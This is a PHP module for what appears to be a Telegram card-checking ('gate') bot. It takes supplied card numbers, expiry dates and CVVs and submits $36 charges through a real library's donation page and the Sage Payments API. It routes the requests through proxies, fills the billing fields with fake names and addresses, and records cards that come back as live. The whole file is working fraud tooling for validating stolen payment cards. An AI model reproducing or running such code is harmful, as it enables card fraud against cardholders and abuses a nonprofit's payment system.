<?php 

use App\Models\Bot;
use App\Gate\{Make, Responses as Res};
use App\Faker\{Name, Address};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# ~ REQ 1 ~ #
$headers1 = ['Host: www.jbilibrary.org', 'Accept: */*', 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 'Origin: https://www.jbilibrary.org', 'Referer: https://www.jbilibrary.org/interior.php?sub=5&op=6'];
$site1 = ['url' => 'https://www.jbilibrary.org/donate/sage.php', 'method' => 'POST', 'post' => 'requestType=payment&amount=36.00', 'headers' => $headers1, 'cookie' => null, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);

$res1 = json_decode($req1->body, true);
$dat1 = json_decode($res1[0], true);

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

# ~ REQ 2 ~ #
$expireDate = $cc[1].substr($cc[2], -2);
$headers2 = ['Host: api.sagepayments.com', 'Accept: text/plain, */*; q=0.01', 'Content-Type: application/json', 'clientId: '.$dat1['clientId'], 'Origin: https://www.jbilibrary.org', 'Referer: https://www.jbilibrary.org/'];
$post2 = '{"merchantId":"'.$dat1['merchantId'].'","authKey":"'.$res1[1].'","requestId":"'.$dat1['orderNumber'].'","cardExpirationDate":"'.$expireDate.'","cardNumber":"'.$cc[0].'","amount":"36.00","cvv":"'.$cc[3].'","nonce":"'.$dat1['salt'].'","billing":{"name":"'.Name::firstName().' '.Name::lastName().'","address":"'.Address::streetAddress().'","city":"'.Address::city().'","state":"'.Address::state().'","postalCode":"'.Address::zip().'"}}';
$site2 = ['url' => 'https://api.sagepayments.com/paymentsjs/v1/api/payment/card', 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => $proxy2];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);

$res2 = json_decode($req2->body, true);

$res2 = $res2['Response'] ?? $res2['gatewayResponse'] ?? null;
$status    = $res2['status'] ?? '';
$message   = $res2['message'] ?? 'Declined';
$cvvResult = $res2['cvvResult'] ?? '';
$avsResult = $res2['avsResult'] ?? '';
$riskCode  = $res2['riskCode'] ?? '';

Res::SetParams($message, $status, $avsResult, $cvvResult);
$res = Res::Sagepay($riskCode);

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));

try {
    $live = Make::SaveLive($res['live'], $user['id'], $cece, $gate['name'], $res, $ccs['bin']);
} catch (\Exception $e) {
    error_log($e->getMessage());
    echo $e->getMessage();
}